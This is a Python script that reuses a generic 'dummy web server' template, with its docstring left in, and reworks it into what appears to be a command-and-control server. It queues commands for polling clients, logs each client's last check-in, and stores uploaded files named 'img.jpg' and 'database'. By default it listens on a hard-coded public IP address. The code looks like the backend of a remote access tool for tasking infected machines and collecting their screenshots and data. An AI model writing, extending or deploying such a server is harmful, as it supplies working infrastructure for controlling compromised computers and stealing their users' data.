#!/usr/bin/env python
"""
Very simple HTTP server in python (Updated for Python 3.7)
Usage:
    ./dummy-web-server.py -h
    ./dummy-web-server.py -l localhost -p 8000
Send a GET request:
    curl http://localhost:8000
Send a HEAD request:
    curl -I http://localhost:8000
Send a POST request:
    curl -d "foo=bar&bin=baz" http://localhost:8000
"""
import argparse
import datetime
from http.server import HTTPServer, BaseHTTPRequestHandler

#scree exit lock
commands = ["empty"]
checkout = ""

def writeImg(data):
    newFile = open("img.jpg", "wb")
    newFile.write(data)
def writeDB(data):
    newFile = open("database", "wb")
    newFile.write(data)

def parseData(data):
    index = data.index(35)
    return [data[:index], data[index+1:]]

def handlePostRequest(header, data):
    if header == "addCommand":
        commands.insert(0, "".join([chr(x) for x in data]))
    else:
        if header == "image":
            writeImg(data)
        if header == "db":
            print(len(data))
            writeDB(data)
def handleGetRequest(request, arg):
    global checkout
    print(arg)


    if arg == "getImg":
        with open("img.jpg", "rb") as image:
            f = image.read()
            b = bytearray(f)
            print(b[0])
            request.wfile.write(b)
        return
    if arg == "lastCheckOut":
        print(checkout)
        request.wfile.write(str(checkout).encode("utf8"))
        return
    if arg == "clear":
        commands.clear()
        request.wfile.write("Clear cmds".encode("utf8"))
        return

    command = arg.split("_")[1]
    print(command)
    commands.insert(0, command)


    #write responce as command we just executed
    request.wfile.write(arg.encode("utf8"))

class S(BaseHTTPRequestHandler):
    def _set_headers(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()

    def _html(self, message):
        """This just generates an HTML document that includes `message`
        in the body. Override, or re-write this do do more interesting stuff.
        """
        content = f"<html><body><h1>{message}</h1></body></html>"
        return content.encode("utf8")  # NOTE: must return a bytes object!

    def do_GET(self):
        global checkout
        self._set_headers()

        length = int(self.headers['content-length']) if 'content-length' in self.headers else 0
        field_data = self.rfile.read(length)
        what = "".join([chr(x) for x in field_data])
        #print(what)
        if what == "command":
            checkout = datetime.datetime.now()

            command = "empty"
            if commands:
                command = commands.pop()
                print(command)

            self.wfile.write(command.encode("utf8"))
            #print(' '.join(commands) +" "+str(command))
        else:
            if "arg" in self.headers:
                arg = self.headers["arg"]
                handleGetRequest(self, arg)
            else:
                args = self.raw_requestline.decode("utf-8").split("?")[1]
                arg = args.split("=")[1].split(" ")[0]
                handleGetRequest(self, arg)


    def do_HEAD(self):
        self._set_headers()

    def do_POST(self):
        length = int(self.headers['content-length'])
        field_data = self.rfile.read(length)
        data = parseData(field_data)
        header = "".join([chr(x) for x in data[0]])
        #print(header)

        handlePostRequest(header, data[1])

        self._set_headers()
        self.wfile.write((header+" has been posted").encode("utf8"))


def run(server_class=HTTPServer, handler_class=S, addr="localhost", port=80):
    server_address = (addr, port)
    httpd = server_class(server_address, handler_class)

    print(f"Starting httpd server on {addr}:{port}")
    httpd.serve_forever()


if __name__ == "__main__":

    parser = argparse.ArgumentParser(description="Run a simple HTTP server")
    parser.add_argument(
        "-l",
        "--listen",
        default = "194.67.87.25",
        help="Specify the IP address on which the server listens",
    )
    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=81,
        help="Specify the port on which the server listens",
    )
    args = parser.parse_args()
    run(addr=args.listen, port=args.port)